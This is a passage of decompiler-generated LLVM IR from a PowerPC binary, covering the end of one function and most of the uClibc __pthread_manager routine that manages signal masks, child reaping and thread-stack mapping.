  br i1 %v2_10015fc8, label %dec_label_pc_10015f64, label %dec_label_pc_10015fd0

dec_label_pc_10015fd0:                            ; preds = %dec_label_pc_10015fb4.backedge, %entry
  %v3_10015fc4.lcssa = phi i32 [ %v3_10015fc49, %entry ], [ %v3_10015fc4, %dec_label_pc_10015fb4.backedge ]
  ret i32 %v3_10015fc4.lcssa

; uselistorder directives
  uselistorder i32 %v2_10015f98, { 1, 0 }
  uselistorder i32 %v2_10015fc0, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 0, 1 }
  uselistorder i32 268525512, { 1, 0 }
  uselistorder i32 -2147483647, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10015f8c, { 1, 0 }
  uselistorder label %dec_label_pc_10015f64, { 1, 0 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-360 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  store i32 268697600, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040aa0.1011 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040ae8.1061 to i32), i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040af0.1062 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10040af0.1062 to i32), i32* @global_var_10040aec.1063, align 4
  %v2_10016008 = ptrtoint i32* %stack_var_-352 to i32
  store i32 ptrtoint (i32* @global_var_10040ae8.1061 to i32), i32* bitcast (i32** @global_var_10040ae4.1064 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_10040aa0.1011 to i32), i32* @r2, align 4
  store i32 %arg1, i32* %r21.global-to-local, align 4
  store i32 %v2_10016008, i32* @r3, align 4
  store i32 268525600, i32* @lr, align 4
  %v1_1001601c = call i32 @sigfillset(i32 %v2_10016008)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016024 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 %v3_10016024, i32* %r4.global-to-local, align 4
  store i32 %v2_10016008, i32* @r3, align 4
  store i32 268525616, i32* @lr, align 4
  %v1_1001602c = call i32 @__GI_sigdelset(i32 %v2_10016008)
  store i32 %v2_10016008, i32* @r3, align 4
  store i32 5, i32* %r4.global-to-local, align 4
  store i32 268525628, i32* @lr, align 4
  %v1_10016038 = call i32 @__GI_sigdelset(i32 %v2_10016008)
  store i32 %v1_10016038, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016040 = load i32, i32* @global_var_100451fc.1018, align 4
  store i32 %v3_10016040, i32* %r0.global-to-local, align 4
  %v3_10016044 = icmp eq i32 %v3_10016040, 0
  store i1 %v3_10016044, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016044, label %dec_label_pc_10016064, label %dec_label_pc_1001604c

dec_label_pc_1001604c:                            ; preds = %entry
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016050 = load i32, i32* @global_var_100450ec.994, align 4
  store i32 %v3_10016050, i32* %r4.global-to-local, align 4
  %v3_10016054 = icmp eq i32 %v3_10016050, 0
  store i1 %v3_10016054, i1* %cr7_eq.global-to-local, align 1
  %tmp26 = icmp slt i32 %v3_10016050, 1
  br i1 %tmp26, label %dec_label_pc_10016064, label %dec_label_pc_1001605c

dec_label_pc_1001605c:                            ; preds = %dec_label_pc_1001604c
  store i32 %v2_10016008, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016064.1065 to i32), i32* @lr, align 4
  %v1_10016060 = call i32 @__GI_sigdelset(i32 %v2_10016008)
  store i32 %v1_10016060, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016064

dec_label_pc_10016064:                            ; preds = %dec_label_pc_1001604c, %entry, %dec_label_pc_1001605c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v2_10016008, i32* %r4.global-to-local, align 4
  store i32 268525684, i32* @lr, align 4
  %v3_10016070 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10016008, i32 0)
  store i32 %v3_10016070, i32* %r3.global-to-local, align 4
  %v3_10016078 = load i32, i32* @global_var_100450c0, align 4
  store i32 %v3_10016078, i32* %r9.global-to-local, align 4
  %v1_1001607c = add i32 %v3_10016078, 24
  %v2_1001607c = inttoptr i32 %v1_1001607c to i32*
  %v3_1001607c = load i32, i32* %v2_1001607c, align 4
  store i32 %v3_1001607c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016084.1066 to i32), i32* @lr, align 4
  %v1_10016080 = call i32 @__pthread_manager_adjust_prio(i32 %v3_1001607c)
  store i32 %v1_10016080, i32* %r3.global-to-local, align 4
  %v2_10016084 = ptrtoint i32* %stack_var_-224 to i32
  br label %dec_label_pc_10016084

dec_label_pc_10016084:                            ; preds = %dec_label_pc_100160a0, %dec_label_pc_10016064
  %v0_10016088 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10016088, i32* %r3.global-to-local, align 4
  store i32 %v2_10016084, i32* %r4.global-to-local, align 4
  store i32 268525720, i32* @lr, align 4
  %v1_10016094 = call i32 @__libc_read(i32 %v0_10016088)
  store i32 %v1_10016094, i32* %r3.global-to-local, align 4
  %v3_10016098 = icmp eq i32 %v1_10016094, -1
  store i1 %v3_10016098, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016098, label %dec_label_pc_100160a0, label %dec_label_pc_100160b0

dec_label_pc_100160a0:                            ; preds = %dec_label_pc_10016084
  %v0_100160a0 = call i32 @__errno_location()
  store i32 %v0_100160a0, i32* %r3.global-to-local, align 4
  %v1_100160a4 = inttoptr i32 %v0_100160a0 to i32*
  %v2_100160a4 = load i32, i32* %v1_100160a4, align 4
  store i32 %v2_100160a4, i32* %r0.global-to-local, align 4
  %v3_100160a8 = icmp eq i32 %v2_100160a4, 4
  store i1 %v3_100160a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100160a8, label %dec_label_pc_10016084, label %dec_label_pc_100160b0

dec_label_pc_100160b0:                            ; preds = %dec_label_pc_10016084, %dec_label_pc_100160a0
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100160b4 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100160b4, i32* %stack_var_-360, align 4
  %v2_100160c4 = ptrtoint i32* %stack_var_-360 to i32
  %v4_10016110 = zext i16 %tmp17 to i32
  %tmp = urem i16 %tmp17, 2
  %v1_10016114 = zext i16 %tmp to i32
  %v3_10016114 = icmp eq i16 %tmp, 0
  %v2_10016130 = icmp ugt i32 %tmp16, 5
  %v3_10016130 = icmp eq i32 %tmp16, 5
  %v2_100163cc = ptrtoint i32* %stack_var_-204 to i32
  %v1_1001613c = mul i32 %tmp16, 4
  %v2_10016144 = add i32 %v1_1001613c, ptrtoint (i32* @global_var_1002e0a8.1068 to i32)
  %v3_10016144 = inttoptr i32 %v2_10016144 to i32*
  br label %dec_label_pc_100160bc

dec_label_pc_100160bc:                            ; preds = %dec_label_pc_10016108, %dec_label_pc_1001611c, %dec_label_pc_10016110, %dec_label_pc_1001667c, %dec_label_pc_100160b0
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 %v2_100160c4, i32* %r3.global-to-local, align 4
  store i32 268525772, i32* @lr, align 4
  %v3_100160c8 = call i32 @__libc_poll(i32 %v2_100160c4, i32 1, i32 2000)
  store i32 %v3_100160c8, i32* %r3.global-to-local, align 4
  store i32 %v3_100160c8, i32* @r31, align 4
  store i32 268525780, i32* @lr, align 4
  %v0_100160d0 = call i32 @getppid()
  store i32 %v0_100160d0, i32* %r3.global-to-local, align 4
  %v3_100160d4 = icmp eq i32 %v0_100160d0, 1
  store i1 %v3_100160d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100160d4, label %dec_label_pc_100160dc, label %dec_label_pc_100160ec

dec_label_pc_100160dc:                            ; preds = %dec_label_pc_100160bc
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100160e8.1067 to i32), i32* @lr, align 4
  %v2_100160e4 = call i32 @pthread_kill_all_threads(i32 9, i32 0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016654 = call i32 @__GI__exit(i32 0)
  store i32 %v1_10016654, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @global_var_100451e4.1056, align 4
  store i32 268527208, i32* @lr, align 4
  %v2_10016664 = call i32 @pthread_reap_children(i32 %v1_10016654, i32 268697600)
  %v3_1001666c = load i32, i32* @global_var_100450c0, align 4
  store i32 %v3_1001666c, i32* %r9.global-to-local, align 4
  store i32 %v3_1001666c, i32* @r3, align 4
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001667c

dec_label_pc_100160ec:                            ; preds = %dec_label_pc_100160bc
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100160f0 = load i32, i32* @global_var_100451e0.1055, align 4
  store i32 %v3_100160f0, i32* %r0.global-to-local, align 4
  %v3_100160f4 = icmp eq i32 %v3_100160f0, 0
  store i1 %v3_100160f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100160f4, label %dec_label_pc_10016108, label %dec_label_pc_100160fc

dec_label_pc_100160fc:                            ; preds = %dec_label_pc_100160ec
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @global_var_100451e0.1055, align 4
  store i32 268525832, i32* @lr, align 4
  %v2_10016104 = call i32 @pthread_reap_children(i32 %v0_100160d0, i32 268697600)
  store i32 %v2_10016104, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016108

dec_label_pc_10016108:                            ; preds = %dec_label_pc_100160ec, %dec_label_pc_100160fc
  %v0_10016108 = load i32, i32* @r31, align 4
  %v3_10016108 = icmp eq i32 %v0_10016108, 1
  store i1 %v3_10016108, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016108, label %dec_label_pc_10016110, label %dec_label_pc_100160bc

dec_label_pc_10016110:                            ; preds = %dec_label_pc_10016108
  store i32 %v4_10016110, i32* %r0.global-to-local, align 4
  store i32 %v1_10016114, i32* %r9.global-to-local, align 4
  br i1 %v3_10016114, label %dec_label_pc_100160bc, label %dec_label_pc_1001611c

dec_label_pc_1001611c:                            ; preds = %dec_label_pc_10016110
  %v0_1001611c = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_1001611c, i32* %r3.global-to-local, align 4
  store i32 %v2_10016084, i32* %r4.global-to-local, align 4
  store i32 268525868, i32* @lr, align 4
  %v1_10016128 = call i32 @__libc_read(i32 %v0_1001611c)
  store i32 %v1_10016128, i32* %r3.global-to-local, align 4
  store i32 %tmp16, i32* %r0.global-to-local, align 4
  store i1 %v3_10016130, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10016130, label %dec_label_pc_100160bc, label %dec_label_pc_10016138

dec_label_pc_10016138:                            ; preds = %dec_label_pc_1001611c
  store i32 %v1_1001613c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002e0a8.1068 to i32), i32* %r9.global-to-local, align 4
  %v4_10016144 = load i32, i32* %v3_10016144, align 4
  %v2_10016148 = add i32 %v4_10016144, ptrtoint (i32* @global_var_1002e0a8.1068 to i32)
  store i32 %v2_10016148, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10016148)
  %v3_10016158 = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_10016158, i32* %r23.global-to-local, align 4
  store i32 268525920, i32* @lr, align 4
  %v0_1001615c = call i32 @__GI_getpagesize()
  store i32 %v0_1001615c, i32* %r3.global-to-local, align 4
  store i32 %v0_1001615c, i32* %r27.global-to-local, align 4
  %v0_10016168 = load i32, i32* @r30, align 4
  %v3_10016168 = icmp eq i32 %v0_10016168, 0
  store i1 %v3_10016168, i1* %cr7_eq.global-to-local, align 1
  %v0_10016170 = load i32, i32* %r23.global-to-local, align 4
  %v1_10016170 = add i32 %v0_10016170, 20
  %v2_10016170 = inttoptr i32 %v1_10016170 to i32*
  %v3_10016170 = load i32, i32* %v2_10016170, align 4
  store i32 %v3_10016170, i32* %r22.global-to-local, align 4
  %v1_10016174 = add i32 %v0_10016170, 412
  %v2_10016174 = inttoptr i32 %v1_10016174 to i32*
  %v3_10016174 = load i32, i32* %v2_10016174, align 4
  store i32 %v3_10016174, i32* %r18.global-to-local, align 4
  br i1 %v3_10016168, label %dec_label_pc_1001619c.preheader, label %dec_label_pc_1001617c

dec_label_pc_1001617c:                            ; preds = %dec_label_pc_10016138
  %v1_1001617c = add i32 %v0_10016168, 4
  %v2_1001617c = inttoptr i32 %v1_1001617c to i32*
  %v3_1001617c = load i32, i32* %v2_1001617c, align 4
  store i32 %v3_1001617c, i32* %r0.global-to-local, align 4
  %v3_10016180 = icmp eq i32 %v3_1001617c, 0
  store i1 %v3_10016180, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016180, label %dec_label_pc_1001619c.preheader, label %dec_label_pc_10016188

dec_label_pc_10016188:                            ; preds = %dec_label_pc_1001617c
  store i32 268525964, i32* @lr, align 4
  %v0_10016188 = call i32 @geteuid()
  %v3_1001618c = icmp eq i32 %v0_10016188, 0
  store i1 %v3_1001618c, i1* %cr7_eq.global-to-local, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_1001618c, label %dec_label_pc_1001619c.preheader, label %dec_label_pc_1001656c

dec_label_pc_1001619c.preheader:                  ; preds = %dec_label_pc_10016188, %dec_label_pc_1001617c, %dec_label_pc_10016138
  store i32 2, i32* %r24.global-to-local, align 4
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100161a4

dec_label_pc_100161a4:                            ; preds = %dec_label_pc_1001619c.preheader, %dec_label_pc_100162c0
  %v0_10016248 = phi i32 [ 2, %dec_label_pc_1001619c.preheader ], [ %v1_100162c0, %dec_label_pc_100162c0 ]
  %v1_100161a8 = mul i32 %v0_10016248, 16
  store i32 ptrtoint (i32* @global_var_10040d40.1024 to i32), i32* %r9.global-to-local, align 4
  %v2_100161b0 = add i32 %v1_100161a8, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %v2_100161b0, i32* %r11.global-to-local, align 4
  %v1_100161b4 = add i32 %v1_100161a8, add (i32 ptrtoint (i32* @global_var_10040d40.1024 to i32), i32 8)
  %v2_100161b4 = inttoptr i32 %v1_100161b4 to i32*
  %v3_100161b4 = load i32, i32* %v2_100161b4, align 4
  store i32 %v3_100161b4, i32* %r0.global-to-local, align 4
  %v3_100161b8 = icmp eq i32 %v3_100161b4, 0
  store i1 %v3_100161b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100161b8, label %dec_label_pc_100161c0, label %dec_label_pc_100162c0

dec_label_pc_100161c0:                            ; preds = %dec_label_pc_100161a4
  %v0_100161c0 = load i32, i32* @r30, align 4
  %v3_100161c0 = icmp eq i32 %v0_100161c0, 0
  store i1 %v3_100161c0, i1* %cr7_eq.global-to-local, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100161c8 = load i32, i32* @global_var_100451bc.995, align 4
  store i32 %v3_100161c8, i32* %r11.global-to-local, align 4
  br i1 %v3_100161c0, label %dec_label_pc_10016208, label %dec_label_pc_100161d0

dec_label_pc_100161d0:                            ; preds = %dec_label_pc_100161c0
  %v1_100161d0 = add i32 %v0_100161c0, 24
  %v2_100161d0 = inttoptr i32 %v1_100161d0 to i32*
  %v3_100161d0 = load i32, i32* %v2_100161d0, align 4
  store i32 %v3_100161d0, i32* %r0.global-to-local, align 4
  %v3_100161d4 = icmp eq i32 %v3_100161d0, 0
  store i1 %v3_100161d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100161d4, label %dec_label_pc_10016208, label %dec_label_pc_100161dc

dec_label_pc_100161dc:                            ; preds = %dec_label_pc_100161d0
  %v1_100161dc = add i32 %v0_100161c0, 28
  %v2_100161dc = inttoptr i32 %v1_100161dc to i32*
  %v3_100161dc = load i32, i32* %v2_100161dc, align 4
  store i32 %v3_100161dc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  %v1_100161e4 = add i32 %v0_100161c0, 32
  %v2_100161e4 = inttoptr i32 %v1_100161e4 to i32*
  %v3_100161e4 = load i32, i32* %v2_100161e4, align 4
  store i32 %v3_100161e4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v1_100161ec = call i32 @__asm_rlwinm(i32 %v3_100161dc, i32 0, i32 0, i32 29)
  store i32 %v1_100161ec, i32* %r11.global-to-local, align 4
  %v0_100161f0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100161f0 = sub i32 %v3_100161dc, %v0_100161f0
  store i32 %v2_100161f0, i32* %r27.global-to-local, align 4
  %v1_100161f4 = add i32 %v1_100161ec, -480
  store i32 %v1_100161f4, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 1, i32* @global_var_100451ec.1069, align 4
  br label %dec_label_pc_100162c8

dec_label_pc_10016208:                            ; preds = %dec_label_pc_100161d0, %dec_label_pc_100161c0
  store i1 %v3_100161c0, i1* %cr7_eq.global-to-local, align 1
  store i32 2097152, i32* %r0.global-to-local, align 4
  %v0_10016210 = load i32, i32* %r27.global-to-local, align 4
  %v2_10016210 = sub i32 2097152, %v0_10016210
  store i32 %v2_10016210, i32* %r29.global-to-local, align 4
  br i1 %v3_100161c0, label %dec_label_pc_10016238, label %dec_label_pc_10016218

dec_label_pc_10016218:                            ; preds = %dec_label_pc_10016208
  %v1_10016218 = add i32 %v0_100161c0, 32
  %v2_10016218 = inttoptr i32 %v1_10016218 to i32*
  %v3_10016218 = load i32, i32* %v2_10016218, align 4
  %v2_1001621c = add i32 %v0_10016210, -1
  %v1_10016220 = add i32 %v2_1001621c, %v3_10016218
  %v2_10016224 = urem i32 %v1_10016220, %v0_10016210
  %v2_10016228 = sub i32 %v1_10016220, %v2_10016224
  store i32 %v2_10016228, i32* %r9.global-to-local, align 4
  %v2_1001622c = icmp ult i32 %v2_10016210, %v2_10016228
  %v4_1001622c = icmp eq i32 %v2_10016210, %v2_10016228
  store i1 %v4_1001622c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001622c, label %dec_label_pc_10016238, label %dec_label_pc_1001623c

dec_label_pc_10016238:                            ; preds = %dec_label_pc_10016218, %dec_label_pc_10016208
  br label %dec_label_pc_1001623c

dec_label_pc_1001623c:                            ; preds = %dec_label_pc_10016218, %dec_label_pc_10016238
  %storemerge = phi i32 [ %v2_10016210, %dec_label_pc_10016238 ], [ %v2_10016228, %dec_label_pc_10016218 ]
  store i32 %storemerge, i32* @r31, align 4
  %v3_10016244 = load i32, i32* @global_var_10045234.1005, align 4
  %tmp29 = mul i32 %v0_10016248, -2097152
  %v2_1001624c = add i32 %v3_100161c8, %tmp29
  store i32 306, i32* %r6.global-to-local, align 4
  %v1_10016254 = add i32 %v2_1001624c, 2097152
  store i32 %v1_10016254, i32* %r9.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v1_1001625c = mul i32 %v3_10016244, 4
  store i32 %v1_1001625c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_10016264 = sub i32 %v1_10016254, %v1_1001625c
  store i32 %v2_10016264, i32* %r3.global-to-local, align 4
  %v1_10016268 = add i32 %v2_1001624c, 2096672
  store i32 %v1_10016268, i32* %r28.global-to-local, align 4
  store i32 268526192, i32* @lr, align 4
  %v7_1001626c = call i32 @mmap(i32 %v2_10016264, i32 %v1_1001625c, i32 7, i32 306, i32 -1, i32 0, i32 %v1_10016254)
  store i32 %v7_1001626c, i32* %r3.global-to-local, align 4
  %v3_10016270 = icmp eq i32 %v7_1001626c, -1
  store i1 %v3_10016270, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016270, label %dec_label_pc_1001623c.dec_label_pc_100162c0_crit_edge, label %dec_label_pc_10016278

dec_label_pc_1001623c.dec_label_pc_100162c0_crit_edge: ; preds = %dec_label_pc_1001623c
  %v0_100162c0.pre = load i32, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_100162c0

dec_label_pc_10016278:                            ; preds = %dec_label_pc_1001623c
  %v0_10016278 = load i32, i32* @r31, align 4
  %v1_10016278 = load i32, i32* %r29.global-to-local, align 4
  %v4_10016278 = icmp eq i32 %v0_10016278, %v1_10016278
  store i1 %v4_10016278, i1* %cr7_eq.global-to-local, align 1
  %v1_1001627c = load i32, i32* %r28.global-to-local, align 4
  %v2_1001627c = sub i32 %v1_1001627c, %v0_10016278
  store i32 %v2_1001627c, i32* %r9.global-to-local, align 4
  %v1_10016280 = add i32 %v2_1001627c, 480
  store i32 %v1_10016280, i32* %r27.global-to-local, align 4
  br i1 %v4_10016278, label %dec_label_pc_100162b4, label %dec_label_pc_10016288

dec_label_pc_10016288:                            ; preds = %dec_label_pc_10016278
  %v0_10016288 = load i32, i32* @r30, align 4
  %v1_10016288 = add i32 %v0_10016288, 20
  %v2_10016288 = inttoptr i32 %v1_10016288 to i32*
  %v3_10016288 = load i32, i32* %v2_10016288, align 4
  store i32 %v3_10016288, i32* %r26.global-to-local, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1001629c = sub i32 %v1_10016280, %v3_10016288
  store i32 %v2_1001629c, i32* %r25.global-to-local, align 4
  store i32 %v3_10016288, i32* %r4.global-to-local, align 4
  store i32 %v2_1001629c, i32* %r3.global-to-local, align 4
  store i32 268526252, i32* @lr, align 4
  %v7_100162a8 = call i32 @mmap(i32 %v2_1001629c, i32 %v3_10016288, i32 0, i32 16, i32 -1, i32 0, i32 %v2_1001627c)
  store i32 %v7_100162a8, i32* %r3.global-to-local, align 4
  %v3_100162ac = icmp eq i32 %v7_100162a8, -1
  store i1 %v3_100162ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100162ac, label %dec_label_pc_100162b4, label %dec_label_pc_100162c8

dec_label_pc_100162b4:                            ; preds = %dec_label_pc_10016288, %dec_label_pc_10016278
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100162c8

dec_label_pc_100162c0:                            ; preds = %dec_label_pc_1001623c.dec_label_pc_100162c0_crit_edge, %dec_label_pc_100161a4
  %v0_100162c0 = phi i32 [ %v0_100162c0.pre, %dec_label_pc_1001623c.dec_label_pc_100162c0_crit_edge ], [ %v0_10016248, %dec_label_pc_100161a4 ]
  %v1_100162c0 = add i32 %v0_100162c0, 1
  store i32 %v1_100162c0, i32* %r24.global-to-local, align 4
  %v2_1001619c = icmp ugt i32 %v1_100162c0, 1023
  %v3_1001619c = icmp eq i32 %v1_100162c0, 1023
  store i1 %v3_1001619c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001619c, label %dec_label_pc_10016558, label %dec_label_pc_100161a4

dec_label_pc_100162c8:                            ; preds = %dec_label_pc_10016288, %dec_label_pc_100162b4, %dec_label_pc_100161dc
  %v0_100162c8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100162c8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 480, i32* @r5, align 4
  store i32 %v0_100162c8, i32* @r31, align 4
  store i32 268526300, i32* @lr, align 4
  %v0_100162d8 = call i32 @__GI_memset()
  store i32 268697600, i32* %r3.global-to-local, align 4
  %v3_100162e4 = load i32, i32* @global_var_100451e8.1070, align 4
  %v3_100162e8 = load i32, i32* @global_var_10045100.1058, align 4
  store i32 ptrtoint (i32* @global_var_10040d40.1024 to i32), i32* %r8.global-to-local, align 4
  %v0_100162f4 = load i32, i32* %r24.global-to-local, align 4
  %v1_100162f4 = mul i32 %v0_100162f4, 16
  store i32 %v1_100162f4, i32* %r29.global-to-local, align 4
  %v1_100162f8 = add i32 %v3_100162e4, 1024
  store i32 %v1_100162f8, i32* %r9.global-to-local, align 4
  %v0_100162fc = load i32, i32* @r31, align 4
  %v1_100162fc = add i32 %v0_100162fc, 72
  %v1_10016300 = add i32 %v3_100162e8, 1
  store i32 %v1_10016300, i32* %r11.global-to-local, align 4
  %v0_10016304 = load i32, i32* @r30, align 4
  %v3_10016304 = icmp eq i32 %v0_10016304, 0
  store i1 %v3_10016304, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10016300, i32* @global_var_10045100.1058, align 4
  %v2_1001630c = add i32 %v1_100162f4, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %v2_1001630c, i32* @r10, align 4
  store i32 %v1_100162f8, i32* @global_var_100451e8.1070, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_10016318 = add i32 %v0_100162fc, 68
  %v3_10016318 = inttoptr i32 %v2_10016318 to i32*
  store i32 %v1_100162fc, i32* %v3_10016318, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_10016320 = load i32, i32* %r24.global-to-local, align 4
  %v1_10016320 = load i32, i32* %r9.global-to-local, align 4
  %v2_10016320 = add i32 %v1_10016320, %v0_10016320
  store i32 %v2_10016320, i32* %r28.global-to-local, align 4
  %v0_10016324 = load i32, i32* @r31, align 4
  %v1_10016324 = add i32 %v0_10016324, 80
  store i32 %v1_10016324, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1001632c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001632c = trunc i32 %v0_1001632c to i8
  %v3_1001632c = add i32 %v0_10016324, 65
  %v4_1001632c = inttoptr i32 %v3_1001632c to i8*
  store i8 %v1_1001632c, i8* %v4_1001632c, align 1
  %v0_10016330 = load i32, i32* %r7.global-to-local, align 4
  %v1_10016330 = load i32, i32* @r31, align 4
  %v2_10016330 = add i32 %v1_10016330, 76
  %v3_10016330 = inttoptr i32 %v2_10016330 to i32*
  store i32 %v0_10016330, i32* %v3_10016330, align 4
  %v0_10016334 = load i32, i32* %r25.global-to-local, align 4
  %v1_10016334 = load i32, i32* @r31, align 4
  %v2_10016334 = add i32 %v1_10016334, 396
  %v3_10016334 = inttoptr i32 %v2_10016334 to i32*
  store i32 %v0_10016334, i32* %v3_10016334, align 4
  %v0_10016338 = load i32, i32* %r26.global-to-local, align 4
  %v1_10016338 = load i32, i32* @r31, align 4
  %v2_10016338 = add i32 %v1_10016338, 400
  %v3_10016338 = inttoptr i32 %v2_10016338 to i32*
  store i32 %v0_10016338, i32* %v3_10016338, align 4
  %v0_1001633c = load i32, i32* %r28.global-to-local, align 4
  %v1_1001633c = load i32, i32* @r31, align 4
  %v2_1001633c = add i32 %v1_1001633c, 16
  %v3_1001633c = inttoptr i32 %v2_1001633c to i32*
  store i32 %v0_1001633c, i32* %v3_1001633c, align 4
  %v0_10016340 = load i32, i32* @r10, align 4
  %v1_10016340 = load i32, i32* @r31, align 4
  %v2_10016340 = add i32 %v1_10016340, 28
  %v3_10016340 = inttoptr i32 %v2_10016340 to i32*
  store i32 %v0_10016340, i32* %v3_10016340, align 4
  %v0_10016344 = load i32, i32* %r6.global-to-local, align 4
  %v1_10016344 = trunc i32 %v0_10016344 to i8
  %v2_10016344 = load i32, i32* @r31, align 4
  %v3_10016344 = add i32 %v2_10016344, 64
  %v4_10016344 = inttoptr i32 %v3_10016344 to i8*
  store i8 %v1_10016344, i8* %v4_10016344, align 1
  %v0_10016348 = load i32, i32* @r31, align 4
  %v2_10016348 = add i32 %v0_10016348, 404
  %v3_10016348 = inttoptr i32 %v2_10016348 to i32*
  store i32 %v0_10016348, i32* %v3_10016348, align 4
  %v0_1001634c = load i32, i32* %r24.global-to-local, align 4
  %v1_1001634c = load i32, i32* @r31, align 4
  %v2_1001634c = add i32 %v1_1001634c, 408
  %v3_1001634c = inttoptr i32 %v2_1001634c to i32*
  store i32 %v0_1001634c, i32* %v3_1001634c, align 4
  %v0_10016350 = load i32, i32* %r4.global-to-local, align 4
  %v1_10016350 = load i32, i32* %r29.global-to-local, align 4
  %v2_10016350 = load i32, i32* %r8.global-to-local, align 4
  %v3_10016350 = add i32 %v2_10016350, %v1_10016350
  %v4_10016350 = inttoptr i32 %v3_10016350 to i32*
  store i32 %v0_10016350, i32* %v4_10016350, align 4
  %v0_10016354 = load i32, i32* %r4.global-to-local, align 4
